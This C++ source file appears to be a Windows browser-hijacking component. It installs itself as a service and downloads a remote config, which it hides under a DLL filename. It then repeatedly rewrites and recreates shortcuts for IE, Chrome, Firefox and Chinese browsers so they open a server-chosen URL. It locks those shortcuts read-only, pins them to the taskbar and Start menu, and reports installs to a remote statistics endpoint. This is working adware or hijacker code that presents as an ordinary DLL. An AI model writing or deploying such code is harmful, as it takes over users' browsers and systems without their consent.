#include "stdafx.h"
#include "AiDll.h"
#include "Regedit.h"
#include "Network.h"
#include <process.h>
#include "ultra/file-op.h"
#include "Shell.h"
#include <time.h>
#pragma comment(lib,"Version.lib")

#include <Wtsapi32.h>
#pragma comment(lib, "Wtsapi32.lib")


#include <ProfInfo.h>

#include <UserEnv.h>
#pragma comment(lib, "UserEnv.lib")

#include <Sddl.h>
#pragma comment(lib, "Advapi32.lib") 


std::wstring AiDll::strCfgPath;

extern HMODULE g_hModule;

int AiDll::Install()
{
	ultra::CreateDirectoryR(ultra::ExpandEnvironment(SERVICE_DIR_L));
	if (AiDll::GetCloudCfg())
	{
		std::wstring dir = ultra::ExpandEnvironment(SERVICE_DIR_L);
		CNetwork* network = CNetwork::Instance();
		if (CheckIsNeedInstall())
		{
			WCHAR szFiles[][MAX_PATH] = {L"Microsoft.VC90.ATL.manifest", L"Microsoft.VC90.CRT.manifest", L"msvcr90.dll",L"msvcp90.dll", L"ATL90.dll", DLL_NAME_L, SERVICE_EXE_NAME_L};
			for (int i = 0; i < 7; ++i)
			{
				CopyFile((ultra::GetModuleFilePath()+szFiles[i]).c_str(), (dir + szFiles[i]).c_str(), FALSE);
			}

			if (IsAdmin())
			{
				ultra::RunApplication(dir + SERVICE_EXE_NAME_L, L"-unregserver", ultra::GetModuleFilePath());
				Sleep(1000);
				ultra::CheckProcessExist(SERVICE_EXE_NAME_L,TRUE);
				network->ReportGoogleStat(L"install",GetCurrentMouleBuildNum().c_str());
				ultra::RunApplication(dir + SERVICE_EXE_NAME_L, L"-install", ultra::GetModuleFilePath());
				return 1;
			}
			else
			{
				ultra::CheckProcessExist(SERVICE_EXE_NAME_L,TRUE);
				//ultra::RunApplication(dir + SERVICE_EXE_NAME_L, L"-run", ultra::GetModuleFilePath());
				ShellExecute(NULL, L"open", (dir + SERVICE_EXE_NAME_L).c_str(), L"-run", ultra::GetModuleFilePath().c_str(), SW_SHOWNORMAL);
			}
		}
		else
		{
			if (!ultra::CheckProcessExist(SERVICE_EXE_NAME_L, FALSE))
			{
				if (IsAdmin())
				{
					ultra::RunApplication(dir + SERVICE_EXE_NAME_L, L"-unregserver", ultra::GetModuleFilePath());
					Sleep(1000);
					network->ReportGoogleStat(L"install",GetCurrentMouleBuildNum().c_str());
					ultra::RunApplication(dir + SERVICE_EXE_NAME_L, L"-install", ultra::GetModuleFilePath());
				}
				else
				{
					ShellExecute(NULL, L"open", (dir + SERVICE_EXE_NAME_L).c_str(), L"-run", ultra::GetModuleFilePath().c_str(), SW_SHOWNORMAL);
				}
			}
		}
	}
	return 0;
}

void AiDll::Work(int magic)
{
	OutputDebugStringW(L"in Work");
	if (MAGIC_NUM ==  magic)
	{
#ifdef NDEBUG
		Sleep(1000*60);
#endif
		CNetwork* network = CNetwork::Instance();
		network->ReportGoogleStat(L"launch",GetCurrentMouleBuildNum().c_str());

		WCHAR szSvcCfg[MAX_PATH] = {0};
		if (!GetUpdateCfgPath(szSvcCfg))
		{
			return;
		}
		PathAppend(szSvcCfg, L"WinUPC.dll");
		AiDll::strCfgPath = szSvcCfg;
		std::wstring szSvcCfg_Old = std::wstring(szSvcCfg)+L".old";
		if (::PathFileExistsW(szSvcCfg))
		{
			if (!DeleteFile(szSvcCfg))
			{
				::MoveFileEx(szSvcCfg, szSvcCfg_Old.c_str(), MOVEFILE_WRITE_THROUGH | MOVEFILE_REPLACE_EXISTING | MOVEFILE_COPY_ALLOWED);
			}
		}
		else
		{
			if (::PathFileExistsW(szSvcCfg_Old.c_str()))
			{
				DeleteFile(szSvcCfg_Old.c_str());
			}
		}
		while(network->HttpDownloadFile(std::wstring(SERVER_DIR) + CFG_INI, szSvcCfg) == false)
		{
			Sleep(1000*60*10);
		}
		SetFileAttributes(szSvcCfg, FILE_ATTRIBUTE_HIDDEN);
		
		HANDLE hThread[4];
		hThread[0] = (HANDLE)_beginthreadex(NULL, 0, AiDll::ModifyShortCutProc, NULL, 0, NULL);
		hThread[1] = (HANDLE)_beginthreadex(NULL, 0, AiDll::CreateShortCutProc, NULL, 0, NULL);
		hThread[2] = (HANDLE)_beginthreadex(NULL, 0, AiDll::CreateItemShortCutProc, NULL, 0, NULL);
		hThread[3] = (HANDLE)_beginthreadex(NULL, 0, AiDll::CreateShortCutProcIE, NULL, 0, NULL);
		::WaitForMultipleObjects(4,hThread,TRUE,INFINITE);
		::CloseHandle(hThread[0]);
		::CloseHandle(hThread[1]);
		::CloseHandle(hThread[2]);
		::CloseHandle(hThread[3]);

	}
	return ;
}


UINT WINAPI  AiDll::ModifyShortCutProc( void* param )
{
	int mscTime = GetPrivateProfileInt(L"msc", L"time", 60*10, AiDll::strCfgPath.c_str());
	int mscSwitch = GetPrivateProfileInt(L"msc", L"switch", 1, AiDll::strCfgPath.c_str());
	WCHAR mscUrl[MAX_PATH] = {0};
	GetPrivateProfileString(L"msc", L"url", L"", mscUrl, MAX_PATH, AiDll::strCfgPath.c_str());
	
	WCHAR cscUrl[MAX_PATH] = {0};
	GetPrivateProfileString(L"csc", L"url", L"", cscUrl, MAX_PATH, AiDll::strCfgPath.c_str());

	WCHAR cscieUrl[MAX_PATH] = {0};
	GetPrivateProfileString(L"cscie", L"url", L"", cscieUrl, MAX_PATH, AiDll::strCfgPath.c_str());

	if (mscSwitch == 0 || mscTime <= 0 || wcscmp(mscUrl, L"") == 0)
	{
		return 0;
	}
	CoInitialize(NULL);
	OutputDebugStringW(L"in mod");

	std::vector<std::wstring> patternVec;
	std::vector<std::wstring> destVec;

	patternVec.push_back(L"*Inter*");
	patternVec.push_back(L"Google Chrome*");
	patternVec.push_back(L"Mozilla Firefox*");
	patternVec.push_back(L"*浏览器*");

	DWORD dwCLSID[] = {CSIDL_COMMON_DESKTOPDIRECTORY,CSIDL_COMMON_STARTMENU,CSIDL_STARTMENU,CSIDL_DESKTOP,CSIDL_PROGRAMS,CSIDL_COMMON_PROGRAMS};
	for (int i = 0; i < ARRAYSIZE(dwCLSID); i++)
	{
		TCHAR szPath[MAX_PATH] = {0};
		if (SHGetSpecialFolderPath(NULL, szPath, dwCLSID[i], 0))
		{
			//OutputDebugStringW(szPath);
			std::wstring wstrPath = szPath;
			std::size_t last = wstrPath.find_last_of(L"\\");
			if (last == std::wstring::npos)
			{
				continue;
			}
			if (last != wstrPath.length()-1)
			{
				wstrPath += L"\\";
			}
			destVec.push_back(wstrPath);
		}
	}
	if (ultra::OSIsVista())
	{
		destVec.push_back(ultra::ExpandEnvironment(L"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\"));
		destVec.push_back(ultra::ExpandEnvironment(L"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\StartMenu\\"));
	}
	else
	{
		destVec.push_back(ultra::ExpandEnvironment(L"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\"));
	}

	while(TRUE)
	{
		for (int j = 0; j < destVec.size(); j++)
		{
			WIN32_FIND_DATA findData = {0};
			std::wstring wstrSearchPath;
			wstrSearchPath = destVec[j] + L"*";

			HANDLE hSearch = FindFirstFile(wstrSearchPath.c_str(), &findData);
			if (hSearch == INVALID_HANDLE_VALUE)
			{
				FindClose(hSearch);
				continue;
			}
			BOOL bRet = TRUE;
			while (bRet)
			{
				if (wcsicmp(findData.cFileName, L".") != 0 && wcsicmp(findData.cFileName, L"..") != 0)
				{
					std::wstring strFileName = findData.cFileName;
					if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
					{
					}
					else
					{
						for (int i = 0; i < patternVec.size(); i++)
						{
							if (ultra::FnMatch(patternVec[i], strFileName) == true)
							{

								std::wstring strPath = destVec[j]+strFileName;
								std::wstring strTarget;
								std::wstring strArguments;
								std::wstring strWorkDirectory;
								std::wstring strIconLocation;
								if (CheckFileExist(strPath) == TRUE)
								{
									//OutputDebugStringW(L"find");
									//OutputDebugStringW(strPath.c_str());
									//xlog("CheckFileExist %s %s %s", ultra::_T2A(strPath).c_str(), ultra::_T2A(strTarget).c_str(), ultra::_T2A(strArguments).c_str());
									Shell::GetShortCutInfo(strPath, strTarget, strArguments, strWorkDirectory, strIconLocation);
									if (strTarget == L"" && ultra::CompareStringNoCase(strArguments, mscUrl) != 0 && ultra::CompareStringNoCase(strArguments, cscUrl) != 0 && ultra::CompareStringNoCase(strArguments, cscieUrl) != 0)
									{
										DeleteFile(strPath.c_str());
										//xlog("CreateShortCutLink %s %s", ultra::_T2A(strFileName).c_str(), szScUrl);
										SetFileAttributes((destVec[j]+strFileName).c_str(), FILE_ATTRIBUTE_NORMAL);
										Shell::CreateShortCutLink(GetNameFromPath(strFileName), mscUrl, GetIEDir(),  destVec[j], mscUrl, L"", strIconLocation);
										SetFileAttributes((destVec[j]+strFileName).c_str(), FILE_ATTRIBUTE_READONLY);
									}
									else if (ultra::CompareStringNoCase(strArguments, mscUrl) != 0 && ultra::CompareStringNoCase(strArguments, cscUrl) != 0 && ultra::CompareStringNoCase(strArguments, cscieUrl) != 0)
									{
										//OutputDebugStringW(L"create");
										//xlog("CreateShortCutLink %s %s", ultra::_T2A(strFileName).c_str(), szScUrl);
										SetFileAttributes((destVec[j]+strFileName).c_str(), FILE_ATTRIBUTE_NORMAL);
										Shell::CreateShortCutLink(GetNameFromPath(strFileName), strTarget, L"", destVec[j], mscUrl, L"", strIconLocation);
										SetFileAttributes((destVec[j]+strFileName).c_str(), FILE_ATTRIBUTE_READONLY);
									}
								}

							}
						}
					}
				}
				bRet = FindNextFile(hSearch, &findData);
			}
			FindClose(hSearch);
		}

		Sleep(mscTime*1000);
	}
	CoUninitialize();
	return 0;
}

UINT WINAPI  AiDll::CreateShortCutProc( void* param )
{
	int cscTime = GetPrivateProfileInt(L"csc", L"time", 60*10, AiDll::strCfgPath.c_str());
	int cscSwitch = GetPrivateProfileInt(L"csc", L"switch", 1, AiDll::strCfgPath.c_str());
	WCHAR cscUrl[MAX_PATH] = {0};
	GetPrivateProfileString(L"csc", L"url", L"", cscUrl, MAX_PATH, AiDll::strCfgPath.c_str());

	if (cscSwitch == 0 || cscTime <= 0 || wcscmp(cscUrl, L"") == 0)
	{
		return 0;
	}
	CoInitialize(NULL);
	std::wstring browserNameList[] = {
		L"360se",L"360安全浏览器7"
		,L"chrome",L"Google Chrome"
		,L"liebao",L"猎豹安全浏览器"
		,L"firefox",L"Mozilla Firefox"
		,L"QQBrowser",L"QQ浏览器"
		,L"360chrome",L"360极速浏览器"
		,L"Maxthon",L"傲游云浏览器"
		,L"SogouExplorer",L"搜狗高速浏览器"
		,L"TaoBrowser",L"淘宝浏览器"
		,L"2345Explorer",L"2345王牌浏览器"
		//,L"IEXPLORE",L"Internet Explorer"
	};

	BOOL bOpenUserClassesRoot = FALSE;

	BOOL bThisProcessCreatedAsUser = TRUE;
	IsThisProcessCreatedAsUser(bThisProcessCreatedAsUser);
	HKEY hKey;
	if (!bThisProcessCreatedAsUser)
	{
		HANDLE hUserToken = GetUserToken();
		if (NULL == hUserToken)
		{
			OutputDebugStringW(L"GetUserToken error");
			return 0;
		}
		if (ERROR_SUCCESS != RegOpenUserClassesRoot(hUserToken,0,KEY_READ,&hKey))
		{
			CloseHandle(hUserToken);
			OutputDebugStringW(L"RegOpenUserClassesRoot error");
			return 0;
		}
		CloseHandle(hUserToken);
	}
	while(TRUE)
	{
		do 
		{
			std::wstring strDefaultPath;
			std::wstring strDefaultName;

			if (bThisProcessCreatedAsUser)
			{
				//OutputDebugStringW(L"Read HKEY_CLASSES_ROOT");
				CRegedit::Read(HKEY_CLASSES_ROOT, L"http\\shell\\open\\command", L"", strDefaultPath);
			}
			else
			{
				CRegedit::Read(hKey, L"http\\shell\\open\\command", L"", strDefaultPath);
			}
			strDefaultPath = GetPathFromString(strDefaultPath);
			//OutputDebugStringW(strDefaultPath.c_str());
			if (strDefaultPath.empty())
			{
				break;
			}
			for (int i = 0; i < ARRAYSIZE(browserNameList); i+=2)
			{
				if (ultra::CompareStringNoCase(browserNameList[i], GetNameFromPath(strDefaultPath))== 0)
				{
					strDefaultName = browserNameList[i+1];
					break;
				}
			}
			if (strDefaultName.empty())
			{
				break;
			}

			std::wstring strSCName = strDefaultName+L".lnk";
			TCHAR szDefaultLnk_CurrentDeskTop[MAX_PATH] = {0};
			std::wstring strUserDeskTop = L"";
			if (SHGetSpecialFolderPath(NULL, szDefaultLnk_CurrentDeskTop, CSIDL_DESKTOP, 0))
			{
				std::wstring wstrserDeskTop= szDefaultLnk_CurrentDeskTop;
				std::size_t last = wstrserDeskTop.find_last_of(L"\\");
				if (last != std::wstring::npos)
				{
					if (last != wstrserDeskTop.length()-1)
					{
						wstrserDeskTop += L"\\";
					}
					strUserDeskTop = wstrserDeskTop;
				}
				::PathAppend(szDefaultLnk_CurrentDeskTop,strSCName.c_str());
			}

			TCHAR szDefaultLnk_AllUserDeskTop[MAX_PATH] = {0};
			if (SHGetSpecialFolderPath(NULL, szDefaultLnk_AllUserDeskTop, CSIDL_COMMON_DESKTOPDIRECTORY, 0))
			{
				::PathAppend(szDefaultLnk_AllUserDeskTop,strSCName.c_str());
			}
			if ((szDefaultLnk_CurrentDeskTop[0] == '\0' || !::PathFileExists(szDefaultLnk_CurrentDeskTop))
				&& (szDefaultLnk_AllUserDeskTop[0] == '\0' || !::PathFileExists(szDefaultLnk_AllUserDeskTop)))
			{
				if (szDefaultLnk_CurrentDeskTop[0] != '\0')
				{
					Shell::CreateShortCutLink(strDefaultName, strDefaultPath, ultra::GetUpperPath(ultra::ExpandEnvironment(strDefaultPath)), strUserDeskTop.c_str(), cscUrl, L"", strDefaultPath);
					SetFileAttributes(szDefaultLnk_CurrentDeskTop, FILE_ATTRIBUTE_READONLY);
				}
			}
			if (ultra::OSIsVista())
			{
				if (szDefaultLnk_CurrentDeskTop[0] == '\0' || !::PathFileExists(szDefaultLnk_CurrentDeskTop))
				{
					break;
				}
				std::wstring strTaskBarPath =  ultra::ExpandEnvironment(L"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\");
				std::wstring strStartMenuPath = ultra::ExpandEnvironment(L"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\StartMenu\\");

				std::wstring strDefaultLnk_TaskBar = strTaskBarPath + strSCName;
				if (!::PathFileExists(strDefaultLnk_TaskBar.c_str()))
				{
					ShellExecute(NULL, L"taskbarpin", szDefaultLnk_CurrentDeskTop, L"", L"", SW_HIDE);
					Sleep(2000);
					if (!::PathFileExists(strDefaultLnk_TaskBar.c_str()))
					{
						PinShortCutLnk(L"taskbarpin",szDefaultLnk_CurrentDeskTop);
					}
				}

				std::wstring strDefaultLnk_StartMenu = strStartMenuPath + strSCName;
				if (!::PathFileExists(strDefaultLnk_StartMenu.c_str()))
				{
					ShellExecute(NULL, L"startpin", szDefaultLnk_CurrentDeskTop, L"", L"", SW_HIDE);
					Sleep(2000);
					if (!::PathFileExists(strDefaultLnk_StartMenu.c_str()))
					{
						PinShortCutLnk(L"startpin",szDefaultLnk_CurrentDeskTop);
					}
				}
				//RevertToSelf();

			}
			else
			{
				std::wstring strQuickLaunch =  ultra::ExpandEnvironment(L"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\");
				std::wstring strDefaultLnk_QuickLaunch = strQuickLaunch + strSCName;
				if (!::PathFileExists(strDefaultLnk_QuickLaunch.c_str()))
				{
					Shell::CreateShortCutLink(strDefaultName, strDefaultPath,ultra::GetUpperPath(ultra::ExpandEnvironment(strDefaultPath)), strQuickLaunch.c_str(), cscUrl, L"", strDefaultPath);
					SetFileAttributes(strDefaultLnk_QuickLaunch.c_str(), FILE_ATTRIBUTE_READONLY);
				}
			}
		} while (FALSE);
		
		Sleep(cscTime*1000);
	}
	CoUninitialize();
	return 0;
}


UINT WINAPI  AiDll::CreateItemShortCutProc( void* param )
{
	int itemCycleDay = GetPrivateProfileInt(L"item", L"cycle", 30, AiDll::strCfgPath.c_str());
	int itemSwitch = GetPrivateProfileInt(L"item", L"switch", 1, AiDll::strCfgPath.c_str());
	WCHAR itemUrl[MAX_PATH] = {0};
	GetPrivateProfileString(L"item", L"url", L"", itemUrl, MAX_PATH, AiDll::strCfgPath.c_str());

	WCHAR itemName[MAX_PATH] = {0};
	GetPrivateProfileString(L"item", L"name", L"", itemName, MAX_PATH, AiDll::strCfgPath.c_str());

	WCHAR itemIco[MAX_PATH] = {0};
	GetPrivateProfileString(L"item", L"ico", L"", itemIco, MAX_PATH, AiDll::strCfgPath.c_str());
	OutputDebugStringW(L"in item");
	if (itemSwitch == 0 
		|| itemCycleDay <= 0 
		|| wcscmp(itemUrl, L"") == 0 
		|| wcscmp(itemName, L"") == 0 
		|| wcscmp(itemIco, L"") == 0 
		|| itemCycleDay < 0)
	{
		return 0;
	}
	
	std::wstring strIcoName = itemIco;
	std::size_t npos = strIcoName.find_last_of(L"/");
	if (std::wstring::npos == npos)
	{
		return 0;
	}
	strIcoName = strIcoName.substr(npos+1);
	if (strIcoName.empty())
	{
		return 0;
	}
	
	WCHAR szCfgDir[MAX_PATH] = {0};
	if (!GetUpdateCfgPath(szCfgDir))
	{
		return 0;
	}

	WCHAR szIcoPath[MAX_PATH] = {0};
	wcscpy(szIcoPath,szCfgDir);
	PathAppend(szIcoPath, strIcoName.c_str());
		
	WCHAR szCfgPath[MAX_PATH] = {0};
	wcscpy(szCfgPath,szCfgDir);
	PathAppend(szCfgPath, L"cfg.ini");

	WCHAR szBuffer[MAX_PATH] = {0};
	GetPrivateProfileString(L"item", L"last", L"0", szBuffer, MAX_PATH, szCfgPath);
	__int64 i64LastTime = _ttoi64(szBuffer);
	if (i64LastTime < 0)
	{
		i64LastTime = 0;
	}
	__time64_t i64CurrentTime = 0;
	_time64(&i64CurrentTime);
	__int64 i64CycleSecond = itemCycleDay*24*60*60;
	if ((__int64)i64CurrentTime < i64LastTime+i64CycleSecond)
	{
		int iSleepTime = (int) (i64LastTime+i64CycleSecond - (__int64) i64CurrentTime );
		Sleep(iSleepTime * 1000);
	}
	i64CurrentTime = 0;
	_time64(&i64CurrentTime);
	std::wstring strTime;
	{
		std::wstringstream ss;
		ss<<i64CurrentTime;
		ss>>strTime;
	}
	CoInitialize(NULL);
	do 
	{
		//OutputDebugStringW(szIcoPath);
		if (!::PathFileExists(szIcoPath))
		{
			CNetwork* network = CNetwork::Instance();
			if (network->HttpDownloadFile(itemIco, szIcoPath) == false)
			{
				break;
			}
		}
		std::wstring strItemName = (std::wstring)(itemName)+L".lnk";
		TCHAR szItemNamePath[MAX_PATH] = {0};
		std::wstring strUserDeskTop = L"";
		if (!SHGetSpecialFolderPath(NULL, szItemNamePath, CSIDL_DESKTOP, 0))
		{
			break;
		}
		
		strUserDeskTop = szItemNamePath;
		std::size_t last = strUserDeskTop.find_last_of(L"\\");
		if (last != std::wstring::npos)
		{
			if (last != strUserDeskTop.length()-1)
			{
				strUserDeskTop += L"\\";
			}
		}

		
		::PathAppend(szItemNamePath,strItemName.c_str());
		//OutputDebugStringW(szItemNamePath);
		WritePrivateProfileString(L"item",L"last",strTime.c_str(),szCfgPath);
		if (::PathFileExists(szItemNamePath))
		{
			DeleteFile(szItemNamePath);
		}
		
		Shell::CreateShortCutLink(itemName, itemUrl, GetIEDir(), strUserDeskTop.c_str(), itemUrl, L"", szIcoPath);
		SetFileAttributes(szItemNamePath, FILE_ATTRIBUTE_READONLY);
		CNetwork* network = CNetwork::Instance();
		network->ReportGoogleStat(L"citem",GetCurrentMouleBuildNum().c_str());
		//OutputDebugStringW(strItemName.c_str());
		//OutputDebugStringW(itemUrl);
		//OutputDebugStringW(strUserDeskTop.c_str());

	} while (FALSE);
	
	CoUninitialize();
	return 0;
}


UINT WINAPI  AiDll::CreateShortCutProcIE( void* param )
{
	int cscTime = GetPrivateProfileInt(L"cscie", L"time", 60*10, AiDll::strCfgPath.c_str());
	int cscSwitch = GetPrivateProfileInt(L"cscie", L"switch", 1, AiDll::strCfgPath.c_str());
	WCHAR cscUrl[MAX_PATH] = {0};
	GetPrivateProfileString(L"cscie", L"url", L"", cscUrl, MAX_PATH, AiDll::strCfgPath.c_str());

	if (cscSwitch == 0 || cscTime <= 0 || wcscmp(cscUrl, L"") == 0)
	{
		return 0;
	}
	CoInitialize(NULL);

	while(TRUE)
	{
		do 
		{
			std::wstring strIEPath;
			CRegedit::Read(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\IEXPLORE.EXE", L"", strIEPath);

			strIEPath = GetPathFromString(strIEPath);
			if (strIEPath.empty())
			{
				break;
			}
			std::wstring strIEName = L"Internet Explorer";
			std::wstring strSCName = strIEName+L".lnk";
			TCHAR szIELnk_CurrentDeskTop[MAX_PATH] = {0};
			std::wstring strUserDeskTop = L"";
			if (SHGetSpecialFolderPath(NULL, szIELnk_CurrentDeskTop, CSIDL_DESKTOP, 0))
			{
				std::wstring wstrserDeskTop= szIELnk_CurrentDeskTop;
				std::size_t last = wstrserDeskTop.find_last_of(L"\\");
				if (last != std::wstring::npos)
				{
					if (last != wstrserDeskTop.length()-1)
					{
						wstrserDeskTop += L"\\";
					}
					strUserDeskTop = wstrserDeskTop;
				}
				::PathAppend(szIELnk_CurrentDeskTop,strSCName.c_str());
			}

			TCHAR szIELnk_AllUserDeskTop[MAX_PATH] = {0};
			if (SHGetSpecialFolderPath(NULL, szIELnk_AllUserDeskTop, CSIDL_COMMON_DESKTOPDIRECTORY, 0))
			{
				::PathAppend(szIELnk_AllUserDeskTop,strSCName.c_str());
			}
			if ((szIELnk_CurrentDeskTop[0] == '\0' || !::PathFileExists(szIELnk_CurrentDeskTop))
				&& (szIELnk_AllUserDeskTop[0] == '\0' || !::PathFileExists(szIELnk_AllUserDeskTop)))
			{
				if (szIELnk_CurrentDeskTop[0] != '\0')
				{
					Shell::CreateShortCutLink(strIEName, strIEPath, ultra::GetUpperPath(ultra::ExpandEnvironment(strIEPath)), strUserDeskTop.c_str(), cscUrl, L"", strIEPath);
					SetFileAttributes(szIELnk_CurrentDeskTop, FILE_ATTRIBUTE_READONLY);
				}
			}
			if (ultra::OSIsVista())
			{
				if (szIELnk_CurrentDeskTop[0] == '\0' || !::PathFileExists(szIELnk_CurrentDeskTop))
				{
					break;
				}
				std::wstring strTaskBarPath =  ultra::ExpandEnvironment(L"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\");
				std::wstring strStartMenuPath = ultra::ExpandEnvironment(L"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\StartMenu\\");

				std::wstring strIELnk_TaskBar = strTaskBarPath + strSCName;
				if (!::PathFileExists(strIELnk_TaskBar.c_str()))
				{
					ShellExecute(NULL, L"taskbarpin", szIELnk_CurrentDeskTop, L"", L"", SW_HIDE);
					Sleep(2000);
					if (!::PathFileExists(strIELnk_TaskBar.c_str()))
					{
						PinShortCutLnk(L"taskbarpin",szIELnk_CurrentDeskTop);
					}
				}

				std::wstring strIELnk_StartMenu = strStartMenuPath + strSCName;
				if (!::PathFileExists(strIELnk_StartMenu.c_str()))
				{
					ShellExecute(NULL, L"startpin", szIELnk_CurrentDeskTop, L"", L"", SW_HIDE);
					Sleep(2000);
					if (!::PathFileExists(strIELnk_StartMenu.c_str()))
					{
						PinShortCutLnk(L"startpin",szIELnk_CurrentDeskTop);
					}
				}
				//RevertToSelf();

			}
			else
			{
				std::wstring strQuickLaunch =  ultra::ExpandEnvironment(L"%APPDATA%\\Microsoft\\Internet Explorer\\Quick Launch\\");
				std::wstring strIELnk_QuickLaunch = strQuickLaunch + strSCName;
				if (!::PathFileExists(strIELnk_QuickLaunch.c_str()))
				{
					Shell::CreateShortCutLink(strIEName, cscUrl,ultra::GetUpperPath(ultra::ExpandEnvironment(strIEPath)), strQuickLaunch.c_str(), cscUrl, L"", strIEPath);
					SetFileAttributes(strIELnk_QuickLaunch.c_str(), FILE_ATTRIBUTE_READONLY);
				}
			}
		} while (FALSE);

		Sleep(cscTime*1000);
	}
	CoUninitialize();
	return 0;
}

std::wstring AiDll::GetCurrentMouleBuildNum()
{
	wchar_t szModulePath[MAX_PATH] = {0};
	if (0 == GetModuleFileName(g_hModule, szModulePath, MAX_PATH))
	{
		return L"0";
	}
	unsigned __int64 i64TimeStamp = 0;
	unsigned __int64 i64Ver = GetFileVersion(szModulePath, &i64TimeStamp);
	UINT uBuild = LOWORD(i64Ver & 0xffffffff);
	std::wstring wstrBuild;
	{
		std::wstringstream wss;
		wss << uBuild;
		wss >> wstrBuild;
	}
	return wstrBuild;
}

bool AiDll::GetCloudCfg()
{
	//WCHAR szCfgPath[MAX_PATH] = {0};
	//ExpandEnvironmentStrings(_T(LOCAL_DIR), szCfgPath, MAX_PATH);
	//PathAppend(szCfgPath, L"cfg.ini");
	CNetwork* network = CNetwork::Instance();

	std::string strReturn;
	if (network->HttpDownloadString(std::wstring(SERVER_DIR)+L"UpdateInfo.lua", strReturn))
	{
		if (strReturn[0] >= 'a' && strReturn[0] <= 'z')
		{
			return true;
		}
	}
	return false;
}

bool AiDll::CheckIsNeedInstall()
{
	bool bRet = false;
	std::wstring dir = ultra::ExpandEnvironment(SERVICE_DIR_L);
	
	WCHAR szInstallFiles[][MAX_PATH] = {DLL_NAME_L, SERVICE_EXE_NAME_L};
	for (int i = 0; i < 2; ++i)
	{
		std::wstring strSrcPath = ultra::GetModuleFilePath()+szInstallFiles[i];
		std::wstring strDestPath = dir + szInstallFiles[i];
		std::wstring strOldDestPath = dir + szInstallFiles[i]+L".old";

		unsigned __int64 i64SrcTimeStamp = 0,i64DestTimeStamp = 0;
		if (!::PathFileExists(strDestPath.c_str()))
		{
			bRet = true;
		}
		else
		{
			unsigned __int64 i64SrcVer = GetFileVersion(strSrcPath.c_str(), &i64SrcTimeStamp);
			unsigned __int64 i64DestVer = GetFileVersion(strDestPath.c_str(), &i64DestTimeStamp);
			if (VerCmp(i64DestVer, i64SrcVer) < 0)
			{
				bRet = true;
				::MoveFileEx(strDestPath.c_str(), strOldDestPath.c_str(), MOVEFILE_WRITE_THROUGH | MOVEFILE_REPLACE_EXISTING | MOVEFILE_COPY_ALLOWED);
			}

		}
		//CopyFile((ultra::GetModuleFilePath()+szFiles[i]).c_str(), (dir + szFiles[i]).c_str(), FALSE);
	}
	return bRet;
}


void AiDll::FreeProcessUserSID(PSID psid)
{
	::HeapFree(::GetProcessHeap(), 0, (LPVOID)psid);
}

BOOL AiDll::GetProcessUserSidAndAttribute(PSID *ppsid, DWORD *pdwAttribute)
{
	if (NULL == ppsid || NULL == pdwAttribute) return FALSE;

	BOOL bRet = FALSE;

	BOOL bSuc = TRUE;
	DWORD dwLastError = ERROR_SUCCESS;

	HANDLE hProcessToken = NULL;
	bSuc = ::OpenProcessToken(::GetCurrentProcess(), TOKEN_QUERY, &hProcessToken);
	dwLastError = ::GetLastError();

	//xlogL(L"OpenProcessToken(::GetCurrentProcess()) return %d , LastError = %lu, , hProcessToken = 0x%p", bSuc, dwLastError, hProcessToken);

	//////////////////////////////////////////////////////////////////////////
	if (bSuc && hProcessToken)
	{
		BYTE *pBuffer = NULL;
		DWORD cbBuffer = 0;
		DWORD cbBufferUsed = 0;
		bSuc = ::GetTokenInformation(hProcessToken, ::TokenUser, pBuffer, cbBuffer, &cbBufferUsed);
		dwLastError = ::GetLastError();
		if (ERROR_INSUFFICIENT_BUFFER == dwLastError)
		{
			pBuffer = new BYTE[cbBufferUsed];
			cbBuffer = cbBufferUsed;
			cbBufferUsed = 0;
			bSuc = ::GetTokenInformation(hProcessToken, ::TokenUser, pBuffer, cbBuffer, &cbBufferUsed);
			dwLastError = ::GetLastError();
			if (bSuc)
			{
				TOKEN_USER *pTokenUser = (TOKEN_USER *)pBuffer;
				DWORD dwLength = ::GetLengthSid(pTokenUser->User.Sid);
				*ppsid = (PSID)::HeapAlloc(::GetProcessHeap(), HEAP_ZERO_MEMORY, dwLength);
				if (*ppsid)
				{
					if (::CopySid(dwLength, *ppsid, pTokenUser->User.Sid))
					{
						*pdwAttribute = pTokenUser->User.Attributes;
						bRet = TRUE;
					}
					else
					{
						::HeapFree(::GetProcessHeap(), 0, (LPVOID)*ppsid);
					}
				}
			}

			delete [] pBuffer;
			pBuffer = NULL;
			cbBuffer = 0;
			cbBufferUsed = 0;
		}
	}
	//////////////////////////////////////////////////////////////////////////

	::CloseHandle(hProcessToken);
	hProcessToken = NULL;

	return bRet;
}

HRESULT AiDll::IsThisProcessCreatedAsUser(BOOL &bCreatedAsUser)
{
	HRESULT hr = E_FAIL;

	PSID psid = NULL;
	DWORD dwAttribute = 0;
	if (GetProcessUserSidAndAttribute(&psid, &dwAttribute))
	{
		LPTSTR pszSID = NULL;
		if (::ConvertSidToStringSid(psid, &pszSID))
		{

			//xlogL(L"ProcessUserSID[2] = %s", pszSID);
			TCHAR szNtNonUniqueID[100] = {0};
			_stprintf(szNtNonUniqueID, _T("S-1-5-%lu-"), SECURITY_NT_NON_UNIQUE);

			hr = S_OK;
			if (_tcsstr(pszSID, szNtNonUniqueID) != NULL)
			{
				//xlogL(_T("This process is user process"));
				bCreatedAsUser = TRUE;
			}
			else
			{
				//xlogL(_T("This process is non-user process"));
				bCreatedAsUser = FALSE;
			}

			::LocalFree((HLOCAL)pszSID);
		}

		FreeProcessUserSID(psid);
	}

	return hr;
}

HANDLE AiDll::GetUserToken()
{
	// 获得当前Session ID
	DWORD dwSessionID = WTSGetActiveConsoleSessionId();

	// 获得当前Session的用户令牌
	HANDLE hToken = NULL;
	if (WTSQueryUserToken(dwSessionID, &hToken) == FALSE)
	{
		DWORD dwLastError = ::GetLastError();
		return NULL;
	}
	return hToken;
}
